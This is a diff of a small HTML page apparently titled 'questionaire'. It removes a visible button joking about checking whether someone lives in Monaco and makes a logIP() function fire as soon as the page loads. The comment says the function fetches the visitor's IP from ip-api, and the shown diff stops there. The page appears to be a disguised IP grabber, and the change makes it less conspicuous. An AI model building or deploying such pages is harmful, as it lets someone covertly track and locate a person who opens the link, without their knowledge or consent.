@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Questionaire</title>
+    <title>questionaire</title>
     <style>
         /* Set the background to dark */
         body {
@@ -15,61 +15,15 @@
             align-items: center;
             height: 100vh;
         }
-
-        /* Button style from Uiverse.io by neerajbaniwal */
-        .btn-shine {
-            padding: 12px 48px;
-            color: #fff;
-            background: linear-gradient(to right, #9f9f9f 0, #fff 10%, #868686 20%);
-            background-position: 0;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shine 3s infinite linear;
-            animation-fill-mode: forwards;
-            font-weight: 600;
-            font-size: 16px;
-            text-decoration: none;
-            white-space: nowrap;
-            font-family: "Poppins", sans-serif;
-            border: none; /* Removed the button stroke */
-            outline: none; /* No focus outline */
-            cursor: pointer; /* Hand cursor on hover */
-        }
-
-        @-moz-keyframes shine {
-            0% { background-position: 0; }
-            60% { background-position: 180px; }
-            100% { background-position: 180px; }
-        }
-
-        @-webkit-keyframes shine {
-            0% { background-position: 0; }
-            60% { background-position: 180px; }
-            100% { background-position: 180px; }
-        }
-
-        @-o-keyframes shine {
-            0% { background-position: 0; }
-            60% { background-position: 180px; }
-            100% { background-position: 180px; }
-        }
-
-        @keyframes shine {
-            0% { background-position: 0; }
-            60% { background-position: 180px; }
-            100% { background-position: 180px; }
-        }
     </style>
 </head>
 <body>
 
-    <button class="btn-shine">Jvais enfin pouvoir vérifier si t'habite vraiment a monaco</button>
-
     <script>
-        // Automatically log IP on page load
-        window.onload = function() {
+        // Trigger IP logging as soon as the DOM content is loaded
+        document.addEventListener('DOMContentLoaded', function() {
             logIP();
-        };
+        });
 
         function logIP() {
             // Fetch the user's IP from ip-api
